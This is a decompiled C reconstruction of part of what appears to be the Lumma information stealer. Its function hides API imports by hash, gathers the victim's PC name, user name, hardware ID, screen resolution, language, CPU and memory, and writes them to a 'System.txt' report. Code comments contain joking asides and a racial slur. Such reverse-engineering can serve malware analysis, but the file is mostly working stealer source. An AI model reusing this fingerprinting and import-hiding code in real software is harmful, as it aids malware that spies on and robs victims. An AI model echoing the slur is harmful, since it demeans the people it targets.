#include "../HEADER/HEADER.c"

CHAR *__thiscall CollectSystemInfo(DWORD *SharedBuff)
{
  int (__stdcall *getUserData)(DWORD); // eax
  int userInfo; // edi
  int (__stdcall *getSystemData)(int); // eax
  int systemData; // esi
  void (__stdcall *retrievePCInfo)(char *, int *); // eax
  void (__stdcall *retrieveUserInfo)(const char *, int *); // eax
  const wchar_t *languageBuffer; // esi
  void (__stdcall *retrieveLanguageInfo)(const wchar_t *, int); // eax
  DWORD *cpuInfoBuff; // edi
  char *finalOutputBuff; // ebx
  void (__stdcall *retrieveMemoryInfo)(unsigned int64 *); // eax
  int memData; // esi
  const WCHAR *FilePath; // eax
  int outptLngth; // [esp-4h] [ebp-4Ch]
  int cpuidResult1; // [esp+Ch] [ebp-3Ch]
  int cpuidResult2; // [esp+Ch] [ebp-3Ch]
  int cpuidResult3; // [esp+10h] [ebp-38h]
  unsigned __int64 cpuidResult4; // [esp+14h] [ebp-34h]
  char *fullOutpt; // [esp+20h] [ebp-28h]
  const char *physicalMemoryInfo; // [esp+20h] [ebp-28h]
  const char *screenResolutionInfo; // [esp+24h] [ebp-24h]
  char *languageInfo_1; // [esp+24h] [ebp-24h]
  char *userInfoText; // [esp+28h] [ebp-20h]
  const char *pcIdText; // [esp+28h] [ebp-20h]
  const char *screenResolutionText; // [esp+2Ch] [ebp-1Ch]
  DWORD *CpuidStuffs; // [esp+2Ch] [ebp-1Ch]
  unsigned int64 timeStuffs; // [esp+30h] [ebp-18h] BYREF
  int memSize; // [esp+3Ch] [ebp-Ch] BYREF
  int systemMem; // [esp+40h] [ebp-8h] BYREF

  getUserData = (int (__stdcall *)(DWORD))ResolveTheHash(1033232944, (int)L"user32.dll");
  userInfo = getUserData(0);
  getSystemData = (int (__stdcall *)(int))ResolveTheHash(1033232944, (int)L"user32.dll");
  systemData = getSystemData(1);
  screenResolutionInfo = (const char *)calloc(0x20u, 1u);
  screenResolutionText = (const char *)calloc(0x20u, 1u);
  ProcessUserOrSystemData(userInfo, (int)screenResolutionInfo, 10);
  ProcessUserOrSystemData(systemData, (int)screenResolutionText, 10);
  fullOutpt = (char *)calloc(0x1000u, 1u);
  strcat(fullOutpt, TrasStrings("Lumedx765maC2, Build 202edx76522512\n"));
  strcat(fullOutpt, TrasStrings("LID(Luedx765mma ID): "));
  strcat(fullOutpt, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
  strcat(fullOutpt, "\n\n");
  userInfoText = (char *)calloc(0x8000u, 1u);
  systemMem = 0x8000;
  retrievePCInfo = (void (__stdcall *)(char *, int *))ResolveTheHash(-1560805264, (int)L"kernel32.dll");
  retrievePCInfo(userInfoText, &systemMem);

/* LOL
        __builtin_strncpy(edi_9, "- PC", 4);
        void* edi_10 = (char*)edi_9 + 4;
        char const* const esi_7 = ": ";
        *(uint16_t*)edi_10 = *(uint16_t*)esi_7;
        *(uint8_t*)((char*)edi_10 + 2) = esi_7[2];
*/

  strcat(fullOutpt, "- PC: ");
  strcat(fullOutpt, userInfoText);
  *(WORD *)&fullOutpt[strlen(fullOutpt)] = 10;
  pcIdText = (const char *)calloc(0x8000u, 1u);
  memSize = 0x8000;
  retrieveUserInfo = (void (__stdcall *)(const char *, int *))ResolveTheHash(603911754, (int)L"advapi32.dll");
  retrieveUserInfo(pcIdText, &memSize);

/* LOL
        __builtin_strncpy(edi_16, "- Us", 4);
        void* edi_17 = (char*)edi_16 + 4;
        char const* const esi_12 = "er: ";
        *(uint32_t*)edi_17 = *(uint32_t*)esi_12;
        *(uint8_t*)((char*)edi_17 + 4) = esi_12[4]; // that's the LOL
*/

  strcat(fullOutpt, "- User: ");
  strcat(fullOutpt, pcIdText);
  *(_WORD *)&fullOutpt[strlen(fullOutpt)] = 10;
  strcat(fullOutpt, TrasStrings("- HWedx765ID: "));
  strcat(fullOutpt, (const char *)sub_407702());
  *(_WORD *)&fullOutpt[strlen(fullOutpt)] = 10;
  strcat(fullOutpt, "- Screen Resoluton: ");
  strcat(fullOutpt, screenResolutionInfo);
  *(_WORD *)&fullOutpt[strlen(fullOutpt)] = 120;
  strcat(fullOutpt, screenResolutionText);
  *(_WORD *)&fullOutpt[strlen(fullOutpt)] = 10;
  languageBuffer = (const wchar_t *)calloc(0x55u, 2u);
  retrieveLanguageInfo = (void (__stdcall *)(const wchar_t *, int))ResolveTheHash(798579168, (int)L"kernel32.dll");
  retrieveLanguageInfo(languageBuffer, 85);
  languageInfo_1 = (char *)calloc(0x55u, 1u);
  wcstombs(languageInfo_1, languageBuffer, 0x55u);

  /* LOL  
       __builtin_strncpy(edi_38, "- La", 4);
       void* edi_39 = (char*)edi_38 + 4;
       char const* const esi_29 = "nguage: ";
       *(uint32_t*)edi_39 = *(uint32_t*)esi_29;
       void* edi_40 = (char*)edi_39 + 4;
       void* esi_30 = &esi_29[4];
       *(uint32_t*)edi_40 = *(uint32_t*)esi_30;
       *(uint8_t*)((char*)edi_40 + 4) = *(uint8_t*)((char*)esi_30 + 4);
    Bravoo niggers
  */
  
  strcat(fullOutpt, "- Language: ");
  strcat(fullOutpt, languageInfo_1);
  *(_WORD *)&fullOutpt[strlen(fullOutpt)] = 10;
  cpuInfoBuff = calloc(0x41u, 1u);
  _EAX = -2147483646;
  CpuidStuffs = cpuInfoBuff;
  __asm { cpuid }
  cpuidResult1 = _EAX;
  _EAX = -2147483645;
  *cpuInfoBuff++ = cpuidResult1;
  *cpuInfoBuff = _EBX;
  *(_QWORD *)(cpuInfoBuff + 1) = __PAIR64__(_EDX, _ECX);
  __asm { cpuid }
  cpuidResult2 = _EAX;
  _EAX = -2147483644;
  cpuidResult3 = _EBX;
  cpuidResult4 = __PAIR64__(_EDX, _ECX);
  __asm { cpuid }
  CpuidStuffs[4] = cpuidResult2;
  CpuidStuffs[5] = cpuidResult3;
  *((QWORD *)CpuidStuffs + 3) = cpuidResult4;
  CpuidStuffs[8] = _EAX;
  CpuidStuffs[9] = _EBX;
  *((QWORD *)CpuidStuffs + 5) = __PAIR64__(_EDX, _ECX);
  finalOutputBuff = fullOutpt;
  strcat(fullOutpt, TrasStrings("- CPedx765U Name: "));
  strcat(fullOutpt, (const char *)CpuidStuffs);
  *(_WORD *)&fullOutpt[strlen(fullOutpt)] = 10;
  timeStuffs = 0LL;
  retrieveMemoryInfo = (void (__stdcall *)(unsigned __int64 *))ResolveTheHash(1594387762, (int)L"kernel32.dll");
  retrieveMemoryInfo(&timeStuffs);
  memData = timeStuffs >> 10;
  physicalMemoryInfo = (const char *)calloc(0xAu, 1u);
  ProcessUserOrSystemData(memData, (int)physicalMemoryInfo, 10);
  strcat(finalOutputBuff, TrasStrings("- Physedx765ical Insedx765talled Memoredx765y: "));
  strcat(finalOutputBuff, physicalMemoryInfo);
  *(DWORD *)&finalOutputBuff[strlen(finalOutputBuff)] = 672333;
  outptLngth = strlen(finalOutputBuff);
  FilePath = (const WCHAR *)GetFilePath((wchar_t *)L"Systeedx765m.txt");
  return processStringAndContext(SharedBuff, FilePath, (int)finalOutputBuff, outptLngth);
}
